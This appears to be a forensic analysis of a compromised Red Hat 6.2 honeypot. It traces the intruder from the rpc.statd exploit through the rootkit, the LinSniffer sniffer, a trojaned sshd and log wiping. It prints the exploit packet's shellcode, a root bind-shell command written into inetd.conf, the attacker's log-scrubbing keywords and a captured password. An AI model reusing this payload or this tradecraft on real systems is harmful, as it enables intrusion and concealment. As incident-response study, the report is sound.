@@ -1,0 +1,790 @@
+=======================================================
+Forensic Analysis of apollo.honeyp.edu ( 172.16.1.107 )
+=======================================================
+
+The following is an analysis of the root, boot, home, usr, var partition 
+and swap space from apollo.honeyp.edu as it existed after being taken
+off-line when it was discovered it was compromised. 
+All dates and times in this document are reported in GMT-0600 (CST) to 
+conform with the local time of the compromised host.
+The document is arranged in chronological order of events occuring 
+throughout the timeframe of the intrusion.  For a more condensed view
+of events see the timeline [Appendix A].
+
+The host apollo.honeyp.edu was compromised in early Nov 2000 while running
+a default Redhat 6.2 Server installation (Linux kernel 2.2.14-5), using the 
+Linux rpc.statd input validation bug documented in CERT Advisory CA-2000-17 [Q1]:
+
+        http://www.cert.org/advisories/CA-2000-17.html
+
+The drive images were analyzed using the Dan Farmer and Wiese Venema's
+"The Coroner's Toolkit" version 1.05 (TCT 1.05) which can be found at:
+
+        http://www.fish.com/security/forensics.html
+
+Additional analysis was done by examining system logs and comparing
+MD5 signatures of binaries against a trusted Redhat 6.2 baseline using
+Tripwire as well as the victim's RPM database for redundant 
+verification [1].
+
+The analysis system was a Pentium-class workstation running patched Mandrake-7.2.
+On the analysis system the disk images were mounted "read-only" at the 
+mount point "/mnt" using the following commands:
+        mount -o ro,loop,nodev,noexec honeypot.hda8.dd /mnt
+        mount -o ro,loop,nodev,noexec honeypot.hda1.dd /mnt/boot
+        mount -o ro,loop,nodev,noexec honeypot.hda5.dd /mnt/usr
+        mount -o ro,loop,nodev,noexec honeypot.hda6.dd /mnt/home
+        mount -o ro,loop,nodev,noexec honeypot.hda7.dd /mnt/var
+
+As a result, all paths will be preceded by "/mnt", rather than just
+a single "/". 
+
+The attacker was first noticed by the network IDS (snort) on Nov 7.
+Two telnet connections and several RPC requests were made followed by a
+buffer overflow attack on rpc.statd to bind a root shell to port 4545 of
+the victim.  The exploit did this by modifying and restarting inetd using
+the increased privileges (root) gained from the successful buffer overflow
+attack.  The attack signature fits the profile of the exploit program
+statdx.c written by ron1n and published under the rpc.statd Bugtraq report:
+
+     http://www.securityfocus.com/data/vulnerabilities/exploits/statdx.c
+	
+
+     [ Snort logs from network IDS showing attacker connections ]
+     ---------------------------------------------------------------------
+     Nov 7 23:11:06 lisa snort[1260]: RPC Info Query: 216.216.74.2:963 -> 172.16.1.107:111
+     Nov 7 23:11:31 lisa snort[1260]: spp_portscan: portscan status from 216.216.74.2: 2 connections across 1 hosts: TCP(2), UDP(0)
+     Nov 7 23:11:31 lisa snort[1260]: IDS08 - TELNET - daemon-active: 172.16.1.101:23 -> 216.216.74.2:1209
+     Nov 7 23:11:34 lisa snort[1260]: IDS08 - TELNET - daemon-active: 172.16.1.101:23 -> 216.216.74.2:1210
+     Nov 7 23:11:47 lisa snort[1260]: spp_portscan: portscan status from 216.216.74.2: 2 connections across 2 hosts: TCP(2), UDP(0)
+     Nov 7 23:11:51 lisa snort[1260]: IDS15 - RPC - portmap-request-status: 216.216.74.2:709 -> 172.16.1.107:111
+     Nov 7 23:11:51 lisa snort[1260]: IDS362 - MISC - Shellcode X86 NOPS-UDP: 216.216.74.2:710 -> 172.16.1.107:871
+
+     11/07-23:11:50.870124 216.216.74.2:710 -> 172.16.1.107:871
+     UDP TTL:42 TOS:0x0 ID:16143
+     Len: 456
+     3E D1 BA B6 00 00 00 00 00 00 00 02 00 01 86 B8  >...............
+     00 00 00 01 00 00 00 02 00 00 00 00 00 00 00 00  ................
+     00 00 00 00 00 00 00 00 00 00 01 67 04 F7 FF BF  ...........g....
+     04 F7 FF BF 05 F7 FF BF 05 F7 FF BF 06 F7 FF BF  ................
+     06 F7 FF BF 07 F7 FF BF 07 F7 FF BF 25 30 38 78  ............%08x
+     20 25 30 38 78 20 25 30 38 78 20 25 30 38 78 20   %08x %08x %08x
+     25 30 38 78 20 25 30 38 78 20 25 30 38 78 20 25  %08x %08x %08x %
+     30 38 78 20 25 30 38 78 20 25 30 38 78 20 25 30  08x %08x %08x %0
+     38 78 20 25 30 38 78 20 25 30 38 78 20 25 30 38  8x %08x %08x %08
+     78 20 25 30 32 34 32 78 25 6E 25 30 35 35 78 25  x %0242x%n%055x%
+     6E 25 30 31 32 78 25 6E 25 30 31 39 32 78 25 6E  n%012x%n%0192x%n
+     90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+     90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+     90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+     90 90 EB 4B 5E 89 76 AC 83 EE 20 8D 5E 28 83 C6  ...K^.v... .^(..
+     20 89 5E B0 83 EE 20 8D 5E 2E 83 C6 20 83 C3 20   .^... .^... ..
+     83 EB 23 89 5E B4 31 C0 83 EE 20 88 46 27 88 46  ..#.^.1... .F'.F
+     2A 83 C6 20 88 46 AB 89 46 B8 B0 2B 2C 20 89 F3  *.. .F..F..+, ..
+     8D 4E AC 8D 56 B8 CD 80 31 DB 89 D8 40 CD 80 E8  .N..V...1...@...
+     B0 FF FF FF 2F 62 69 6E 2F 73 68 20 2D 63 20 65  ..../bin/sh -c e
+     63 68 6F 20 34 35 34 35 20 73 74 72 65 61 6D 20  cho 4545 stream
+     74 63 70 20 6E 6F 77 61 69 74 20 72 6F 6F 74 20  tcp nowait root
+     2F 62 69 6E 2F 73 68 20 73 68 20 2D 69 20 3E 3E  /bin/sh sh -i >>
+     20 2F 65 74 63 2F 69 6E 65 74 64 2E 63 6F 6E 66   /etc/inetd.conf
+     3B 6B 69 6C 6C 61 6C 6C 20 2D 48 55 50 20 69 6E  ;killall -HUP in
+     65 74 64 00 00 00 00 09 6C 6F 63 61 6C 68 6F 73  etd.....localhos
+     74 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  t...............
+     ---------------------------------------------------------------------
+
+
+The first indication of an intruder on the compromised host was seen on
+Nov 8 00:08:40 when 2 telnet connections were registered in the secure log
+and two inetd processes were killed.  Additionally, part of a deleted messages
+log was recovered using unrm and the lazarus tools from TCT.
+An entry from rpc.statd in this log shows the buffer overflow string used 
+to gain system access.  Non-ASCII data from the buffer overflow string has been 
+omitted, but matches the IDS log.  This fits the signature of the attack 
+recorded approximately one hour earlier by the IDS.  The intruder may have 
+been doing an automated scan for this exploit then came back to the host later 
+when the exploit proved effective on the host. It could also be that the initial
+attempt failed but the intruder tried again later using different parameters.
+The logs can be seen below.  
+
+        /var/log/secure
+        ---------------
+        Nov  8 00:08:40 apollo in.telnetd[2077]: connect from 216.216.74.2
+        Nov  8 00:08:40 apollo in.telnetd[2078]: connect from 216.216.74.2
+
+        /var/log/messages
+        -----------------
+        Nov  8 00:08:41 apollo inetd[408]: pid 2077: exit status 1
+        Nov  8 00:08:41 apollo inetd[408]: pid 2078: exit status 1
+
+	/var/log/messages (deleted log)
+	-------------------------------
+        Nov  8 00:09:00 apollo rpc.statd[270]: SM_MON request for hostname containing '/':
+        [ binary omiited ]
+        08049f10 bffff754 000028f8 4d5f4d53 72204e4f 65757165 66207473 6820726f 6e74736f
+        20656d61 746e6f63 696e6961 2720676e 203a272f bffff704 bffff705 bffff706 bffff707
+        /bin/sh -c echo 4545 stream tcp nowait root /bin/sh sh -i >> /etc/inetd.conf;
+        killall -HUP inetd 
+
+After the inetd backdoor was installed, no activity by the intruder is registered
+in the system for about 8 hours.  This also supports the theory that the intruder
+did an initial automated scan, then came back the following day to inspect the
+vulnerable host.
+Using 'mactime' to inspect file timestamps reveals that a privileged user logged
+into the system on Nov 8 08:45 [2].  Access to the network login message and host access
+files indicate the login, while console security permission access indicates that
+the user was privileged (i.e. root).
+
+        --------------------------------------------------------------------------------------------
+        Nov 08 00 08:45:18      161 .a. -rw-r--r-- root     root     /mnt/etc/hosts.allow
+                                  0 .a. -rw-r--r-- root     root     /mnt/etc/hosts.deny
+        Nov 08 00 08:45:19       63 .a. -rw-r--r-- root     root     /mnt/etc/issue.net
+        Nov 08 00 08:45:24     1504 .a. -rw-r--r-- root     root     /mnt/etc/security/console.perms
+        --------------------------------------------------------------------------------------------
+
+A few minutes later various cracking tools including trojaned binaries, a network 
+sniffer, network scanner, exploits, and information gathering programs are 
+installed in a hidden directory (/mnt/usr/man/.Ci).  A more detailed analysis
+of these tools was also done to discover their purpose [3].  Several of the trojan
+programs and snif (renamed from LinSniffer) come from the Linux Rootkit version 4.
+This was discovered from strings found within the binaries themselves.  Another 
+string common to several utilities was '/dev/.oz/.nap/rkit/terror'.  References to
+a rootkit containing similar strings was found at a Linux website and in 
+comp.security.linux [4].  The newsgroup article was found using a beta version of 
+the Google Usenet search engine [5].  One reference refers to the collection of 
+programs as the OZ rootkit, but a clean distribution could not be found using
+these keywords.
+
+-----------------------------------------------------------------------------------------------------
+        Nov 08 00 08:51:53     4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/
+                                118 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/ /Anap
+                                 83 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/addps
+                             185988 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/find
+                             147900 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/inetd
+                              12495 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/killall
+                                156 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/needz
+                               4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/paki
+                               8524 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/paki/slice2
+                               6793 .a. -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/paki/stream.c
+                              49800 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/pstree
+                             133344 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/q
+                             132785 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/qs
+                               4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan
+                               4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd
+                                114 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/a.sh
+                              12716 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/amdx
+                              13023 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/ben
+                               1455 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/ben.c
+                              15667 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/pscan
+                               4442 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/pscan.c
+                               4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/bind
+                               1760 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/bind/ibind.sh
+                               3980 .a. -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/bind/pscan.c
+                               4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/daemon
+                               5907 .a. -rw------- 1010     users    /mnt/usr/man/.Ci/scan/daemon/lscan2.c
+                              12392 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/daemon/z0ne
+                               4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/port
+                               4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/port/strobe
+                                171 .a. -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/INSTALL
+                               1187 .a. -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/Makefile
+                                 17 .a. -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/VERSION
+                               3296 .a. -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/strobe.1
+                              17364 .a. -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/strobe.c
+                              39950 .a. -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/strobe.services
+                               4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/statd
+                               4390 .a. -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/statd/classb
+                              19140 .a. -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/statd/r
+                              21800 .a. -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/statd/statdx
+                               4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/wu
+                              26676 .a. -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/wu/fs
+                              37760 .a. -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/wu/wu
+                               4096 .a. drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x
+                              15092 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/pscan
+                               3980 .a. -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/x/pscan.c
+                              17969 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/x
+                               1259 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/xfil
+                                385 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/xscan
+                               5324 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/sp.pl
+                             350996 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/syslogd
+        Nov 08 00 08:51:54      714 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/a.sh
+                               7229 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/snif
+        Nov 08 00 08:51:55      698 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/clean
+                             147900 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/inetd
+                              12495 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/killall
+                              49800 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/pstree
+                             133344 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/q
+                             132785 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/qs
+                               4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan
+                               4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd
+                                114 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/a.sh
+                              12716 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/amdx
+                              13023 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/ben
+                               1455 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/ben.c
+                              15667 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/pscan
+                               4442 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/amd/pscan.c
+                               4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/bind
+                               1760 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/bind/ibind.sh
+                               3980 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/bind/pscan.c
+                               4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/daemon
+                               5907 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/daemon/lscan2.c
+                              12392 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/daemon/z0ne
+                               4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/port
+                               4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/port/strobe
+                                171 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/INSTALL
+                               1187 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/Makefile
+                                 17 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/VERSION
+                               3296 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/strobe.1
+                              17364 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/strobe.c
+                              39950 ..c -rw------- 1010     users    /mnt/usr/man/.Ci/scan/port/strobe/strobe.services
+                               4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/statd
+                               4390 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/statd/classb
+                              19140 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/statd/r
+                              21800 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/statd/statdx
+                               4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/wu
+                              26676 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/wu/fs
+                              37760 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/wu/wu 
+                               4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x
+                              15092 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/pscan
+                               3980 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/scan/x/pscan.c
+                              17969 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/x
+                               1259 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/xfil
+                                385 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/scan/x/xscan
+                               3098 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/snap
+                               5324 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/sp.pl
+                             350996 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/syslogd
+        Nov 08 00 08:51:56     4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/
+                                118 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/ /Anap
+                              12408 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/addn
+                                 83 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/addps
+                            1052024 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/bx
+                                699 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/chmod-it
+                                328 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/do
+                             185988 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/find
+                              18535 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/fix
+                                156 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/needz
+                               4096 ..c drwxr-xr-x 1010     users    /mnt/usr/man/.Ci/paki
+                               8524 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/paki/slice2
+                               6793 ..c -rw-r--r-- 1010     users    /mnt/usr/man/.Ci/paki/stream.c
+                                188 ..c -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/rmS
+------------------------------------------------------------------------------------------------------
+
+After installing the toolkit, the attacker disables command histories by 
+linking history files to /dev/null for user, system, and temporary history files.
+Then several common commmands and system daemons are moved to a backup folder and
+replaced with trojaned files.  The 'fix' command is used to make the checksum of
+the trojaned binary match the original and modify the MAC times to prevent 
+detection of the modifications.  Read access is still detected, however, since
+fix seems to read the file to calculate the checksum before recording the MAC times.
+The files .a, .p, p, and r are created for use by the trojaned binaries [Q3].  
+These files contain names of processes and IP address prefixes to hide when displaying
+system information with commands like ls, ifconfig, ps, and netstat.  The new tcpd 
+disables TCP wrappers logging of connections.
+ 
+------------------------------------------------------------------------------------------------------
+        Nov 08 00 08:52:09        9 m.c lrwxrwxrwx root     root     /mnt/.bash_history -> /dev/null
+                                  9 m.c lrwxrwxrwx root     root     /mnt/root/.bash_history -> /dev/null
+        Nov 08 00 08:52:10    19840 .a. -rwxr-xr-x root     root     /mnt/sbin/ifconfig
+                                  9 m.c lrwxrwxrwx root     root     /mnt/tmp/.bash_history -> /dev/null
+                              60926 .a. -r-xr-xr-x root     root     /mnt/usr/bin/top
+                               4096 m.c drwxr-xr-x root     root     /mnt/usr/games
+                                  9 mac lrwxrwxrwx root     root     /mnt/usr/games/.bash_history -> /dev/null
+                               4096 mac drwxr-xr-x root     root     /mnt/usr/man/.Ci/backup
+                              42736 mac -rwxr-xr-x root     root     /mnt/usr/man/.Ci/backup/ifconfig
+                              43024 mac -rwxr-xr-x root     root     /mnt/usr/man/.Ci/backup/ls
+                              66736 mac -rwxr-xr-x root     root     /mnt/usr/man/.Ci/backup/netstat
+                              60080 mac -r-xr-xr-x root     root     /mnt/usr/man/.Ci/backup/ps
+                              23568 mac -rwxr-xr-x root     root     /mnt/usr/man/.Ci/backup/tcpd
+                              34896 mac -r-xr-xr-x root     root     /mnt/usr/man/.Ci/backup/top
+                              18535 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/fix
+                              26736 .a. -rwxr-xr-x root     root     /mnt/usr/sbin/identd
+                              31625 .a. -rwxr-xr-x root     root     /mnt/usr/sbin/tcpd
+        Nov 08 00 08:52:12     4096 m.c drwxr-xr-x root     root     /mnt/usr/man
+                                102 mac -rw-r--r-- root     root     /mnt/usr/man/.a
+                                 58 mac -rw-r--r-- root     root     /mnt/usr/man/.p
+                                 58 mac -rw-r--r-- root     root     /mnt/usr/man/p
+                                 61 m.c -rw-r--r-- root     root     /mnt/usr/man/r 
+------------------------------------------------------------------------------------------------------
+
+The toolkit installation continues by starting a network sniffer, specifically LinSniffer.
+LinSniffer is associated with the files tcp.log where it stores captured network traffic, 
+sniff.pid for its process id, and sp.pl a log output filter.  The filter helps the attacker
+find interesting information such as passwords sniffed off the wire.  The program 'snif' was
+determined to be LinSniffer by comparing its internal function names with that of LinSniffer
+using 'nm -p' and the fact that sp.pl is made specifically to parse LinSniffer output [6].
+Output from 'strings' also shows an association with the sniff.pid and tcp.log files within
+the program text [7].
+The sniffer log, tcp.log, was empty but had not been accessed since the sniffer was started.
+This may indicate that the intruder had improperly configured the sniffer for logging or no
+pertinent network traffic was seen by LinSniffer [Q4]. 
+
+-----------------------------------------------------------------------------------------------
+        Nov 08 00 08:52:13     7229 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/snif
+                                  5 mac -rw-r--r-- root     root     /mnt/usr/man/.Ci/sniff.pid
+                                  0 mac -rw-r--r-- root     root     /mnt/usr/man/.Ci/tcp.log 
+-----------------------------------------------------------------------------------------------
+
+After the rootkit, sniffer, and various other tools are installed, the attacker runs a
+script to remove system log entries in messages, secure, and xferlog.  Entries containing
+the following strings were removed. 
+
+----------
+sshd
+log
+games
+209.86
+own
+owned
+Pro
+snif
+ident
+splitrock
+209.255
+echo
+----------
+
+This is followed by a change to the hidden process list /dev/ptyp and execution of a script
+to remove vulnerable service files and kill associated proceses.  The attacker was most 
+likely trying to secure the machine against other possible intruders and lower the 
+machine's vulnerability profile to prevent alerts to system administrators during a 
+vulnerability scan.
+
+-----------------------------------------------------------------------------------------------
+        Nov 08 00 08:52:15      171 ..c -rw-r--r-- 1010     users    /mnt/dev/ptyp
+                                714 .a. -rwxr-xr-x 1010     users    /mnt/usr/man/.Ci/a.sh
+-----------------------------------------------------------------------------------------------
+
+List of removed services [Q3]
+-------------------------------------------------------
+/usr/sbin/rpc.*  /usr/sbin/smbd   /usr/sbin/portmap
+/usr/sbin/nmbd   /usr/sbin/ypserv /usr/sbin/snmpd
+/sbin/rpc.statd  /usr/sbin/atd    /usr/sbin/rpc.rquotad
+/usr/sbin/lockd  /sbin/lockd
+/usr/sbin/nfsd   /usr/bin/nfsd
+/usr/sbin/rpciod /usr/bin/rpciod
+/usr/sbin/smbd   /usr/bin/smbd
+/usr/sbin/nmbd   /usr/bin/nmbd
+/usr/sbin/apmd   /usr/bin/apmd
+/usr/sbin/amd    /usr/bin/amd
+/usr/sbin/amq    /usr/bin/amq 
+-------------------------------------------------------
+
+Once the system hardening and log cleaning is completed several RPM packages are installed.
+These packages and their install times were first noticed in the 'mactime' output and
+corroborated with install times listed in the RPM database [8].  All the packages installed
+are believed to be normal programs (i.e. not trojaned).  The services were also started
+after installation.
+The nfs-utils package installed is not vulnerable to the rpc.statd used by the attacker
+to originally gain access to the victim [Q3].
+
+Install times from RPM database
+---------------------------------------------------------------------
+am-utils-6.0.1s11-1.6.0 Install date: Wed 08 Nov 2000 08:52:26 AM CST
+lpr-0.48-1              Install date: Wed 08 Nov 2000 08:52:32 AM CST
+make-3.77-6             Install date: Wed 08 Nov 2000 08:52:32 AM CST
+screen-3.9.4-3          Install date: Wed 08 Nov 2000 08:52:33 AM CST
+telnet-0.10-29          Install date: Wed 08 Nov 2000 08:52:33 AM CST
+ypserv-1.3.9-1          Install date: Wed 08 Nov 2000 08:52:33 AM CST
+wu-ftpd-2.6.0-14.6x     Install date: Wed 08 Nov 2000 08:53:41 AM CST
+nfs-utils-0.1.9.1-1     Install date: Wed 08 Nov 2000 08:53:49 AM CST
+---------------------------------------------------------------------
+
+Also during these installations, an IRC client (BitchX v 75p3) is started by the attacker. 
+Several source code files from a standard IRC eggdrop bot were recovered from the /usr
+disk partition using 'lazarus' [9].  Comparing the recovered source code against known 
+eggdrop source using diff revealed it to be eggdrop1.1.6 by Robey Pointer with additional 
+bot scripts created by Toro.  The source can be found at:
+
+	ftp://ftp.eggheads.org/pub/eggdrop/GNU/1.1/eggdrop1.1.6.tar.gz
+  
+Several trojaned servers were then installed under /usr/local/sbin.  These included
+a secure shell server and BIND daemon.  The ssh server is installed and a host key
+is generated.  When logging into a machine via ssh that is already a known host, 
+notification of a new host key can indicate an intrusion.  Of course, the 
+administrator may have also simply changed the host key although that is unusually.
+
+        ---------------------------------------------------------------------------------------------------------
+        Nov 08 00 08:53:06     1024 m.c drwxr-x--- root     root     /mnt/root
+                               1024 .a. drwxr-xr-x root     root     /mnt/root/.ssh
+                               3970 .a. -rw-r--r-- root     root     /mnt/usr/lib/libbsd-compat.a
+                                 15 .a. lrwxrwxrwx root     root     /mnt/usr/lib/libbsd.a -> libbsd-compat.a
+                                 23 .a. lrwxrwxrwx root     root     /mnt/usr/lib/libcrypt.so -> ../../lib/libcr                         21 .a. lrwxrwxrwx root     root     /mnt/usr/lib/libnsl.so -> ../../lib/libnsl.                         22 .a. lrwxrwxrwx root     root     /mnt/usr/lib/libutil.so -> ../../lib/libutiNov 08 00 08:53:08    34816 .a. drwxr-xr-x root     root     /mnt/dev
+                              12288 m.c -rw-rw-r-- root     root     /mnt/etc/psdevtab
+                               1024 m.c drwxr-xr-x root     root     /mnt/root/.ssh
+                                512 .a. -rw------- root     root     /mnt/root/.ssh/random_seed
+        Nov 08 00 08:53:10      880 .a. -rw-r--r-- root     root     /mnt/etc/ssh_config
+                                537 m.c -rw------- root     root     /mnt/etc/ssh_host_key
+                                341 mac -rw-r--r-- root     root     /mnt/etc/ssh_host_key.pub
+                                512 m.c -rw------- root     root     /mnt/root/.ssh/random_seed
+        Nov 08 00 08:53:11      880 m.c -rw-r--r-- root     root     /mnt/etc/ssh_config
+                                  3 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/slogin -> ssh
+                                  4 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/ssh -> ssh1
+                                 11 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/ssh-keygen -> ssh-keygen                     327262 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/ssh-keygen1
+                             604938 mac -rws--x--x root     root     /mnt/usr/local/bin/ssh1
+        Nov 08 00 08:53:12       21 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/make-ssh-known-hosts ->
+                              21228 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/make-ssh-known-hosts1
+                                  4 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/scp -> scp1
+                              90424 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/scp1
+                                  8 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/ssh-add -> ssh-add1
+                             337617 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/ssh-add1
+                                 10 mac lrwxrwxrwx root     root     /mnt/usr/local/bin/ssh-agent -> ssh-agent1
+                             343586 mac -rwxr-xr-x root     root     /mnt/usr/local/bin/ssh-agent1
+                                  5 m.c lrwxrwxrwx root     root     /mnt/usr/local/sbin/sshd -> sshd1
+                             643674 m.c -rwxr-xr-x root     root     /mnt/usr/local/sbin/sshd1
+        Nov 08 00 08:53:13        4 .a. lrwxrwxrwx root     root     /mnt/bin/awk -> gawk
+                             148848 .a. -rwxr-xr-x root     root     /mnt/bin/gawk
+                             148848 .a. -rwxr-xr-x root     root     /mnt/bin/gawk-3.0.4
+                              20240 .a. -rwxr-xr-x root     root     /mnt/bin/ln
+                                955 m.c -rwxr-xr-x root     root     /mnt/etc/rc.d/rc.local
+                                684 m.c -rw-r--r-- root     root     /mnt/etc/sshd_config
+        ---------------------------------------------------------------------------------------------------------
+
+The new ssh server prevents logging of connections to utmp and wtmp as well as recording
+login, password, and incoming host information to the file /var/tmp/nap.  A backdoor login
+using a key defined at compile time is also enabled.  This file was left on the system with
+an entry for a root login.  The file's connection to sshd was discovered while running 
+'strings' on the sshd binary.
+
+        'strings - sshd1' output
+        ----------------------------------------------------------
+        ...
+        /usr/tmp/nap
+        +-[ User Login ]-------------------- --- --- - -
+        | username: %s password: %s hostname: %s
+        +----------------------------------- ----- --- -- -- -
+        ...
+        ----------------------------------------------------------
+
+	Contents of /var/tmp/nap ( /usr/tmp linked to /var/tmp )
+	+-[ User Login ]-------------------- --- --- - -
+        | username: root password: tw1Lightz0ne hostname: c871553-b.jffsn1.mo.home.com
+        +----------------------------------- ----- --- -- -- - 
+
+Partial remains of the install script were recovered from partition freespace using the
